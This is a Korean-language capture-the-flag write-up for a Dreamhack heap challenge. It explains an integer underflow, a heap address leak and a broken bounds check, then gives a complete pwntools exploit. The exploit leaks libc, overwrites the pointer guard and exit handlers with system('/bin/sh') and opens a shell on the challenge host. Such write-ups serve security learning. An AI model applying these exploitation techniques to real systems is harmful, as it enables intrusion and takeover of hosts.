보호기법
```bash
[*] '/home/csh/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

처음 유저의 돈은 (1 << 19), `Japanese Wagyu 1024g`은 (1 << 16)원이고, `MAX_SLOT`이 0x11이므로 Integer underflow가 발생한다. money >= (1 >> 31) 을 만족하므로 flag를 살 수 있고, `view_slots`에서 libc_base leak이 가능하다.

물건을 사면 청크가 세 번 할당되는데, 첫 번째 청크(size : 0x20) 에 순서대로
할당된 ptr, 물건의 가격, 할당된 description 이 있다.
물건을 팔면 세 청크가 모두 free된다.

malloc은 청크를 NULL로 정리해주지 않으므로 만약  0x20 크기의 user 데이터로 청크가 재할당된다면 `info_user`를 통해 첫 번째 청크의 할당된 description 주소, 즉 heap_base를 가져올 수 있다.

edit_user에서 `check_idx`가 사용된다.
```C
int check_idx(unsigned long long min, unsigned long long idx, unsigned long long max)
{ // check [min, idx)
    if (min <= idx < max)
        return True;
    else
        return False;
}
```

그런데 min <= idx < max은 개발자가 의도한 대로 작동하지 않는다. (min <= idx) < max 로 간주한다.
1. min <= idx를 검사해 옳으면 1, 옳지 않으면 0을 반환한다.
2. 1.의 결과에 따라 반환된 1또는 0을 max와 비교한다.

따라서 min <= idx라면, max가 2이상이면 무조건 Ture를 반환한다.

```C
void edit_user()
{
    if (user_cnt == 0)
    {
        puts("not select user or didn't create user?");
        return;
    }
    uint8_t idx;
    printf("select user idx > ");
    scanf("%hhu", &idx);
    if (idx >= MAX_USER || !users[idx])
        return;
    unsigned long long cnt = 1;
    unsigned long long off;
    uint8_t val;
    while (cnt <= users[idx]->len)
    {
        write(1, "offset > ", 9);
        unsigned long long off;
        scanf("%llu", &off);
        if (off == 0xffffffffffffffff)
            break;
        if (check_idx(0, off, users[idx]->len))
        {
            write(1, "byte > ", 7);
            scanf("%hhu", &users[idx]->name[off]);
        }
        cnt++;
    }
    write(1, "[*] Done!\n", 10);
    info_user();
    exit(0);
}
```
offset이 unsigned long long int이므로 heap 영역에서 libc 영역까지 닿는다. 함수의 마지막에 `exit`이 있으므로 exit_handler overwrite 를 해주면 되겠다. \([참고](https://velog.io/@chk_pass/Exit-handler-overwrite)\)

```python
from pwn import *

p = remote('host3.dreamhack.games', 15194)
#p = process('./main')
l = ELF('./libc.so.6')

def create(l : int, name : bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(l).encode())
    p.sendafter(b'> ', name)

def info_user() -> list:
    p.sendlineafter(b'> ', b'4')
    m = list()
    while True:
        msg = p.recvline()
        if b'create' not in msg :
            m.append(msg)
        else :
            return m

def select(idx : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())

def buy(idx : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())

def sell():
    p.sendlineafter(b'> ', b'2')

def info_market() -> list:
    p.sendlineafter(b'> ', b'3')
    m = list()
    while True:
        msg = p.recvline()
        if b'buy' not in msg :
            m.append(msg)
        else :
            return m
    
def logout():
    p.sendlineafter(b'> ', b'4')

create(0x100, b'a' * 10)
select(0)
buy(5)
sell()
logout()
create(0x10, b'a' * 0x10)
heap_base = u64(info_user()[3].strip().split(b' ')[-1][16:].ljust(8, b'\x00')) - (0x55555555c4a0 - 0x55555555c000)
print(hex(heap_base))

select(0)
for _ in range(9):
    buy(5)
buy(6)
l.address = int(info_market()[-2].split(b'(')[1].split(b'$')[0].decode()) - (0x7ffff7ea67d0 - 0x7ffff7d92000)
print(hex(l.address))
logout()

name_p = heap_base + 0x350
fs_base = l.address + (0x7FFFF7D8F740 - 0x7ffff7d92000)
initial = l.address + (0x7ffff7fadf00 - 0x7ffff7d92000)

#edit
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'0')
payload = 0
for i in range(8):
    p.sendlineafter(b'offset > ', str(fs_base + 0x30 - name_p + i).encode())
    p.sendlineafter(b'byte > ', str((payload >> (8 * i)) & 0xff).encode())
    
payload = 4
for i in range(8):
    p.sendlineafter(b'offset > ', str(initial + 0x10 - name_p + i).encode())
    p.sendlineafter(b'byte > ', str((payload >> (8 * i)) & 0xff).encode())

payload = ((l.sym['system'] << 0x11) & 0xffffffffffffffff) ^ ((l.sym['system'] << 0x11) >> 64)
for i in range(8):
    p.sendlineafter(b'offset > ', str(initial + 0x18 - name_p + i).encode())
    p.sendlineafter(b'byte > ', str((payload >> (8 * i)) & 0xff).encode())

payload = list(l.search(b'/bin/sh'))[0]
for i in range(8):
    p.sendlineafter(b'offset > ', str(initial + 0x20 - name_p + i).encode())
    p.sendlineafter(b'byte > ', str((payload >> (8 * i)) & 0xff).encode())
    
p.interactive()
```